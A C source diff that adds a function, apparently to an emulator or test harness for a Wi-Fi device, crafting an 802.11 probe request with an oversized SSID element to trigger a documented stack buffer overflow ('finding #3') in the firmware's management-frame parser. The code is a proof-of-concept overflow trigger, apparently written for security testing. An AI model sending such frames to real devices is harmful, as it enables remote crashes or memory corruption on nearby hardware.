@@ -1627,6 +1627,30 @@ void vap_inject(const uint8_t *frame, uint32_t length)
   queue_frame(frame, length, -40, vap_channel);
 }
 
+/* A probe request a station in radio range sends to a rabbit that is its own
+ * access point (config mode): an SSID information element of ssid_len bytes.
+ * ieee80211_input_mgt() copies it into a 33-byte stack buffer with the
+ * element's own length -- a length past 32 overruns it (finding #3). */
+void vap_inject_probe(uint32_t ssid_len)
+{
+  uint8_t out[VAP_FRAME_MAX], ssid[256];
+  struct ieee80211_frame *fr = (struct ieee80211_frame *)out;
+  uint8_t *p = out + sizeof(*fr);
+  static const uint8_t attacker[6] = { 0x02, 0xde, 0xad, 0xbe, 0xef, 0x01 };
+
+  if(ssid_len > 255) ssid_len = 255;
+  memset(ssid, 'A', ssid_len);
+  memset(fr, 0, sizeof(*fr));
+  fr->i_fc[0] = IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_PROBE_REQ;
+  fr->i_fc[1] = IEEE80211_FC1_DIR_NODS;
+  memcpy(fr->i_addr1, ieee80211_broadcast_address, IEEE80211_ADDR_LEN);
+  memcpy(fr->i_addr2, attacker, IEEE80211_ADDR_LEN);
+  memcpy(fr->i_addr3, ieee80211_broadcast_address, IEEE80211_ADDR_LEN);
+  p = put_ie(p, IEEE80211_ELEMID_SSID, ssid, (uint8_t)ssid_len);
+  sim_log("attacker: probe request with a %u-byte SSID element", ssid_len);
+  vap_inject(out, (uint32_t)(p - out));
+}
+
 /* What the radio's own header calls these. Key slot 0 is the pairwise key;
  * anything else is a group key. */
 #define RT2501_CIPHER_NONE_ 0
